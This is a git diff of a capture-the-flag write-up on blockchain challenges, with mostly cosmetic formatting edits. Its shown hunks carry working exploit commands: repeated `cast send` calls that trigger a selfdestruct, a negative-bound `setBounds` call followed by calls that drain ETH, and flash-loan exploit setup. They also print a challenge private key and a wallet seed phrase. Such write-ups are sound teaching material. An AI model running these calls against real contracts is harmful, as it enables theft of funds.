@@ -25,14 +25,14 @@ To solve ethereum based blockchain challenges, I use the [Foundry development to
 
 This challenge is a basic warm-up that only requires calling a single function multiple times to win. We are provided with two ports on the same server e.g. ports 43886 and 58931 on server `94.237.63.128`. To test the RPC server is responding appropriately, we can use the following `cast` command to fetch the timestamp of the genesis block:
 
-```bash
+```c {hl_lines=[1]}
 $ cast age 1 --rpc-url http://94.237.63.128:58931
 Thu Mar 14 07:26:46 2024
 ```
 
 Additionally, we can use `nc` to interact with the other port to get information about the target contract and our user's private key:
 
-```bash
+```c {hl_lines=[1]}
 $ nc 94.237.63.128 43886
 1 - Connection information
 2 - Restart Instance
@@ -70,8 +70,8 @@ I.e. when the hash of the previous block has a remainder of 7 when divided by 10
 
 To exploit this contract, we can use a `cast` command like this, and call it many times (it took me 9 tries) to eventually cause the selfdestruct to execute:
 
-```bash
-$ cast send --rpc-url http://94.237.63.128:58931 --private-key 0x5be08fea40d9d70f39d8daba50f6a0e470aa6701665cedce9a6c3f8457e5ed14 0xC665cd467185eA510a6D4499Bc2aB16C58E6A6ac "pullTrigger()"
+```c
+$ cast send --rpc-url "http://94.237.63.128:58931" --private-key 0x5be08fea40d9d70f39d8daba50f6a0e470aa6701665cedce9a6c3f8457e5ed14 0xC665cd467185eA510a6D4499Bc2aB16C58E6A6ac "pullTrigger()"
 ```
 
 As you can see, the `cast send` command was used to send a transaction which executed the `pullTrigger()` function on the target contract address. After running this a bunch of times, we can use the utility service on the other port to get the flag (see action 3 above).
@@ -133,14 +133,14 @@ The vulnerability in this contract is that the `setBounds()` function stores the
 
 To exploit this vulnerability, we can use the following cast send command to update the lower bound to -5 ETH as follows:
 
-```bash
-$ cast send --rpc-url http://<IP_ADDR>:<RPC_PORT> --private-key <PRIV_KEY> <TARGET_CONTRACT> "setBounds(int64,int64)" -- -5000000000000000000 100000000
+```c
+$ cast send --rpc-url "http://<IP_ADDR>:<RPC_PORT>" --private-key "<PRIV_KEY>" "<TARGET_CONTRACT>" "setBounds(int64,int64)" -- -5000000000000000000 100000000
 ```
 
 This is how we can pass in parameters to contract functions when we call them. We can also use `cast call` to verify the state variable `lowerBound` was updated correctly like this:
 
-```bash
-$ cast call --rpc-url http://<IP_ADDR>:<RPC_PORT> --private-key <PRIV_KEY> <TARGET_CONTRACT> "lowerBound()(int64)"
+```c
+$ cast call --rpc-url "http://<IP_ADDR>:<RPC_PORT>" --private-key "<PRIV_KEY>" "<TARGET_CONTRACT>" "lowerBound()(int64)"
 -5000000000000000000
 ```
 
@@ -149,12 +149,12 @@ Note that `lowerBound()` is a function that returns the `lowerBound` state varia
 
 Next, we call `sendRandomETH()` as follows to send us a random amount of eth between 0 and `max(int64)` Wei (or 9.22 ETH). We need to call this a couple of times to transfer more than 10 ETH:
 
-```bash
-$ cast send --rpc-url http://<IP_ADDR>:<RPC_PORT> --private-key <PRIV_KEY> <TARGET_CONTRACT> "sendRandomETH()"
+```c
+$ cast send --rpc-url "http://<IP_ADDR>:<RPC_PORT>" --private-key "<PRIV_KEY>" "<TARGET_CONTRACT>" "sendRandomETH()"
 
-$ cast send --rpc-url http://<IP_ADDR>:<RPC_PORT> --private-key <PRIV_KEY> <TARGET_CONTRACT> "sendRandomETH()"
+$ cast send --rpc-url "http://<IP_ADDR>:<RPC_PORT>" --private-key "<PRIV_KEY>" "<TARGET_CONTRACT>" "sendRandomETH()"
 
-$ cast balance --rpc-url http://<IP_ADDR>:<RPC_PORT> <TARGET_CONTRACT>
+$ cast balance --rpc-url "http://<IP_ADDR>:<RPC_PORT>" --private-key "<PRIV_KEY>" "<TARGET_CONTRACT>"
 479502396641477447848
 ```
 
@@ -177,21 +177,21 @@ NOTE: Network is regtest, check connection info in the handler first.
 ```
 
 We can SSH to the server with the following command:
-```bash
+```c
 $ ssh -p <SSH_PORT> satoshi@<IP_ADDR>
 ```
 
 
 Once logged in as satoshi, we find a seed phrase in the user's home directory:
 
-```bash
+```c {hl_lines=[1]}
 satoshi@ng-team-21362-blockchainrecoveryca2024-l0r53-77749b7cf9-jjjlz ➜  ~ cat wallet/electrum-wallet-seed.txt        
 another friend embrace cinnamon move midnight slice neutral lend music ladder exact
 ```
 
 As the filename mentions electrum wallet, we download this wallet and set it up to connect to the provided RPC port and network name:
 
-```bash
+```c
 $ electrum --regtest --oneserver -s <IP_ADDR>:<RPC_PORT>:t
 ```
 
@@ -206,7 +206,7 @@ As usual, once we have solved the challenge, we get the flag from the admin port
 
 This was the only challenge that was rated hard, and involves many more files. As background, I want to explain the concept of a flash loan within smart contracts, as that is the basis of how this challenge works.
 
-A flash loan is a type of uncollateralized loan where borrowers can gain access to funds without putting down any collateral. Usually, when implemented in Solidity, these contracts require that the loan amount (+ a fee) is returned to the Loan contract within the same transaction, so the Loan contract doesn't lose any of the depositors' funds. If the loan amount is not paid back by the borrower, the transaction is automatically reverted, keeping the funds safe.
+A **flash loan** is a type of uncollateralized loan where **borrowers can gain access to funds without putting down any collateral**. Usually, when implemented in Solidity, these contracts require that the loan amount (+ a fee) is returned to the Loan contract within the same transaction, so the Loan contract doesn't lose any of the depositors' funds. If the loan amount is not paid back by the borrower, the transaction is automatically reverted, keeping the funds safe.
 
 In the challenge, we are provided with 7 solidity files, and the usual 2 ports (challenge admin and RPC). We start with the `Setup.sol` contract to see what conditions are required to solve the challenge. The Setup contract sets up a Token contract and LoanPool contract, and provides the following `isSolved()` function:
 
@@ -270,7 +270,7 @@ The flow of the solution is as follows:
 
 Here are the commands I used to set up the vulnerable contracts on the Sepolia testnet, and exploit them with the Foundry framework:
 
-```bash
+```c
 $ forge create Setup --private-key $PRIV_KEY --constructor-args <MY_USER_ADDRESS>
 $ cast call <SETUP_CONTRACT_ADDRESS> "isSolved()(bool)" --private-key $PRIV_KEY
 false
